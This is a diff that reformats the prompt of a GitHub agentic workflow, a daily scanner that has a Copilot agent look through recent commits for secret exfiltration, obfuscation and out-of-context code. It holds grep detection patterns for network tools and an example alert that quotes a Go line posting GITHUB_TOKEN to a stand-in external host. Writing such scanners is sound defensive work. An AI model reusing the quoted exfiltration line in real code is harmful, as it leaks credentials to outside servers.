@@ -1,27 +1,27 @@
 ---
 description: Daily security scan that reviews code changes from the last 3 days for suspicious patterns indicating malicious agentic threats
 on:
-  # schedule: daily
-  workflow_dispatch:
+    # schedule: daily
+    workflow_dispatch:
 permissions:
-  contents: read
-  actions: read
-  security-events: read
+    contents: read
+    actions: read
+    security-events: read
 tracker-id: malicious-code-scan
 engine: copilot
 tools:
-  github:
-    toolsets: [repos, code_security]
-  bash: true
+    github:
+        toolsets: [repos, code_security]
+    bash: true
 safe-outputs:
-  create-code-scanning-alert:
-    driver: "Malicious Code Scanner"
-  threat-detection: false
+    create-code-scanning-alert:
+        driver: 'Malicious Code Scanner'
+    threat-detection: false
 timeout-minutes: 15
 strict: true
 imports:
-  - shared/mood.md
-  - shared/reporting.md
+    - shared/mood.md
+    - shared/reporting.md
 source: github/gh-aw/.github/workflows/daily-malicious-code-scan.md@852cb06ad52958b402ed982b69957ffc57ca0619
 ---
 
@@ -34,6 +34,7 @@ You are the Daily Malicious Code Scanner - a specialized security agent that ana
 ## Mission
 
 Review all code changes made in the last three days and identify suspicious patterns that could indicate:
+
 - Attempts to exfiltrate secrets or sensitive data
 - Code that doesn't fit the project's normal context
 - Unusual network activity or data transfers
@@ -71,6 +72,7 @@ git log --since="3 days ago" --pretty=format:"%h - %an, %ar : %s" > /tmp/recent_
 Look for these red flags in the changed code:
 
 #### Secret Exfiltration Patterns
+
 - Network requests to external domains not in allow-lists
 - Environment variable access followed by external communication
 - Base64 encoding of sensitive-looking data
@@ -79,6 +81,7 @@ Look for these red flags in the changed code:
 - Unusual file system writes to temporary or hidden directories
 
 **Example patterns to detect:**
+
 ```bash
 # Search for suspicious network patterns
 grep -E "(curl|wget|fetch|http\.get|requests\.)" /tmp/changed_files.txt | while read -r file; do
@@ -94,6 +97,7 @@ done
 ```
 
 #### Out-of-Context Code Patterns
+
 - Files with imports or dependencies unusual for their location
 - Code in unexpected directories (e.g., ML models in a CLI tool)
 - Sudden introduction of cryptographic operations
@@ -102,6 +106,7 @@ done
 - Sudden changes in code complexity or style
 
 **Example patterns to detect:**
+
 ```bash
 # Check for unusual file additions
 git log --since="3 days ago" --diff-filter=A --name-only --pretty=format: | \
@@ -127,6 +132,7 @@ done
 ```
 
 #### Suspicious System Operations
+
 - Execution of shell commands with user input
 - File operations in sensitive directories
 - Process spawning or system calls
@@ -139,47 +145,50 @@ done
 For each file that changed in the last 3 days:
 
 1. **Get the full diff** to understand what changed:
-   ```bash
-   git diff HEAD~$(git rev-list --count --since="3 days ago" HEAD)..HEAD
-   ```
+
+    ```bash
+    git diff HEAD~$(git rev-list --count --since="3 days ago" HEAD)..HEAD
+    ```
 
 2. **Analyze new function additions** for suspicious logic:
-   ```bash
-   git log --since="3 days ago" --all -p | grep -A 20 "^+func\|^+def\|^+function"
-   ```
+
+    ```bash
+    git log --since="3 days ago" --all -p | grep -A 20 "^+func\|^+def\|^+function"
+    ```
 
 3. **Check for obfuscated code**:
-   - Long strings of hex or base64
-   - Unusual character encodings
-   - Deliberately obscure variable names
-   - Compression or encryption of code
+    - Long strings of hex or base64
+    - Unusual character encodings
+    - Deliberately obscure variable names
+    - Compression or encryption of code
 
 4. **Look for data exfiltration vectors**:
-   - Log statements that include secrets
-   - Debug code that wasn't removed
-   - Error messages containing sensitive data
-   - Telemetry or analytics code added
+    - Log statements that include secrets
+    - Debug code that wasn't removed
+    - Error messages containing sensitive data
+    - Telemetry or analytics code added
 
 ### 4. Contextual Analysis
 
 Use the GitHub API tools to gather context:
 
 1. **Review recent PRs and commits** to understand the changes:
-   ```bash
-   # Get list of authors from last 3 days
-   git log --since="3 days ago" --format="%an" | sort | uniq
-   ```
+
+    ```bash
+    # Get list of authors from last 3 days
+    git log --since="3 days ago" --format="%an" | sort | uniq
+    ```
 
 2. **Check if changes align with repository purpose**:
-   - Review repository description and README
-   - Compare against established code patterns
-   - Verify changes match issue/PR descriptions
+    - Review repository description and README
+    - Compare against established code patterns
+    - Verify changes match issue/PR descriptions
 
 3. **Identify anomalies**:
-   - New contributors with suspicious patterns
-   - Large code additions without proper review
-   - Changes to security-sensitive files
-   - Modifications to CI/CD workflows
+    - New contributors with suspicious patterns
+    - Large code additions without proper review
+    - Changes to security-sensitive files
+    - Modifications to CI/CD workflows
 
 ### 5. Threat Scoring
 
@@ -211,6 +220,7 @@ When suspicious patterns are found, create code-scanning alerts with this struct
 ```
 
 **Categories**:
+
 - `secret-exfiltration`: Patterns suggesting secret theft
 - `out-of-context`: Code that doesn't fit the project
 - `suspicious-network`: Unusual network activity
@@ -219,6 +229,7 @@ When suspicious patterns are found, create code-scanning alerts with this struct
 - `privilege-escalation`: Attempts to gain elevated access
 
 **Severity Mapping**:
+
 - Threat score 9-10: `error`
 - Threat score 7-8: `error`
 - Threat score 5-6: `warning`
@@ -268,57 +279,60 @@ A successful malicious code scan:
 Your output MUST:
 
 1. **If suspicious patterns are found**:
-   - **CALL** the `create_code_scanning_alert` tool for each finding
-   - Each alert must include: rule_id, message, severity, file_path, start_line, description
-   - Provide detailed descriptions explaining the threat and remediation
+    - **CALL** the `create_code_scanning_alert` tool for each finding
+    - Each alert must include: rule_id, message, severity, file_path, start_line, description
+    - Provide detailed descriptions explaining the threat and remediation
 
 2. **If no suspicious patterns are found** (REQUIRED):
-   - **YOU MUST CALL** the `noop` tool to log completion
-   - This is a **required safe output** - the workflow will fail if you don't call it
-   - Call the tool with this message structure:
-   ```json
-   {
-     "noop": {
-       "message": "✅ Daily malicious code scan completed. Analyzed [N] files changed in the last 3 days. No suspicious patterns detected."
-     }
-   }
-   ```
-   - **DO NOT just write this message in your output text** - you MUST actually invoke the `noop` tool
+    - **YOU MUST CALL** the `noop` tool to log completion
+    - This is a **required safe output** - the workflow will fail if you don't call it
+    - Call the tool with this message structure:
+
+    ```json
+    {
+        "noop": {
+            "message": "✅ Daily malicious code scan completed. Analyzed [N] files changed in the last 3 days. No suspicious patterns detected."
+        }
+    }
+    ```
+
+    - **DO NOT just write this message in your output text** - you MUST actually invoke the `noop` tool
 
 3. **Analysis summary** (in alert descriptions or noop message):
-   - Number of files analyzed
-   - Number of commits reviewed
-   - Types of patterns searched for
-   - Confidence level of findings
+    - Number of files analyzed
+    - Number of commits reviewed
+    - Types of patterns searched for
+    - Confidence level of findings
 
 ## Example Alert Output
 
-```json
+````json
 {
-  "create_code_scanning_alert": [
-    {
-      "rule_id": "malicious-code-scanner/secret-exfiltration",
-      "message": "Potential secret exfiltration: environment variable access followed by external network request",
-      "severity": "error",
-      "file_path": "pkg/agent/new_feature.go",
-      "start_line": 42,
-      "description": "**Threat Score: 9/10**\n\n**Pattern Detected**: This code reads the GITHUB_TOKEN environment variable and immediately makes an HTTP request to an external domain (example-analytics.com) that is not in the project's approved domains list.\n\n**Code Context**:\n```go\ntoken := os.Getenv(\"GITHUB_TOKEN\")\nhttp.Post(\"https://example-analytics.com/track\", \"application/json\", bytes.NewBuffer([]byte(token)))\n```\n\n**Security Impact**: High - This pattern could be used to exfiltrate GitHub tokens to an attacker-controlled server.\n\n**Recommended Actions**:\n1. Review the commit that introduced this code (commit abc123)\n2. Verify if example-analytics.com is a legitimate service\n3. Check if this domain should be added to allowed network domains\n4. Consider revoking any tokens that may have been exposed\n5. If malicious, remove this code and investigate how it was introduced"
-    },
-    {
-      "rule_id": "malicious-code-scanner/out-of-context",
-      "message": "Cryptocurrency mining code detected in CLI tool",
-      "severity": "warning",
-      "file_path": "cmd/gh-aw/helper.go",
-      "start_line": 156,
-      "description": "**Threat Score: 7/10**\n\n**Pattern Detected**: This file imports cryptocurrency mining libraries that are not used anywhere else in the project.\n\n**Code Context**: Recent commit added imports for 'crypto/sha256' and 'math/big' with functions performing repetitive hash calculations typical of proof-of-work mining.\n\n**Security Impact**: Medium - While not directly malicious, resource-intensive mining operations in a CLI tool are highly unusual and suggest supply chain compromise.\n\n**Recommended Actions**:\n1. Review why these mining-related operations were added\n2. Check if the author has legitimate business justification\n3. Consider removing if not essential to core functionality"
-    }
-  ]
+    "create_code_scanning_alert": [
+        {
+            "rule_id": "malicious-code-scanner/secret-exfiltration",
+            "message": "Potential secret exfiltration: environment variable access followed by external network request",
+            "severity": "error",
+            "file_path": "pkg/agent/new_feature.go",
+            "start_line": 42,
+            "description": "**Threat Score: 9/10**\n\n**Pattern Detected**: This code reads the GITHUB_TOKEN environment variable and immediately makes an HTTP request to an external domain (example-analytics.com) that is not in the project's approved domains list.\n\n**Code Context**:\n```go\ntoken := os.Getenv(\"GITHUB_TOKEN\")\nhttp.Post(\"https://example-analytics.com/track\", \"application/json\", bytes.NewBuffer([]byte(token)))\n```\n\n**Security Impact**: High - This pattern could be used to exfiltrate GitHub tokens to an attacker-controlled server.\n\n**Recommended Actions**:\n1. Review the commit that introduced this code (commit abc123)\n2. Verify if example-analytics.com is a legitimate service\n3. Check if this domain should be added to allowed network domains\n4. Consider revoking any tokens that may have been exposed\n5. If malicious, remove this code and investigate how it was introduced"
+        },
+        {
+            "rule_id": "malicious-code-scanner/out-of-context",
+            "message": "Cryptocurrency mining code detected in CLI tool",
+            "severity": "warning",
+            "file_path": "cmd/gh-aw/helper.go",
+            "start_line": 156,
+            "description": "**Threat Score: 7/10**\n\n**Pattern Detected**: This file imports cryptocurrency mining libraries that are not used anywhere else in the project.\n\n**Code Context**: Recent commit added imports for 'crypto/sha256' and 'math/big' with functions performing repetitive hash calculations typical of proof-of-work mining.\n\n**Security Impact**: Medium - While not directly malicious, resource-intensive mining operations in a CLI tool are highly unusual and suggest supply chain compromise.\n\n**Recommended Actions**:\n1. Review why these mining-related operations were added\n2. Check if the author has legitimate business justification\n3. Consider removing if not essential to core functionality"
+        }
+    ]
 }
-```
+````
 
 ## ⚠️ CRITICAL REMINDER
 
 **YOU MUST produce a safe output:**
+
 - **If threats found**: Call the `create_code_scanning_alert` tool for each finding
 - **If no threats found**: Call the `noop` tool with a completion message
 
